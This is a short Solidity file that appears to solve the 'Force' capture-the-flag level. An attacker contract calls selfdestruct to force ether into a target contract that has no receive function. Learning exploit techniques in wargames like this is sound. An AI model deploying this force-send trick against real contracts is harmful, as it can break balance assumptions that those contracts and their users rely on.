// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract HackTheForce {

    function hack(address _address) public payable {
        selfdestruct(payable(_address));
    }
}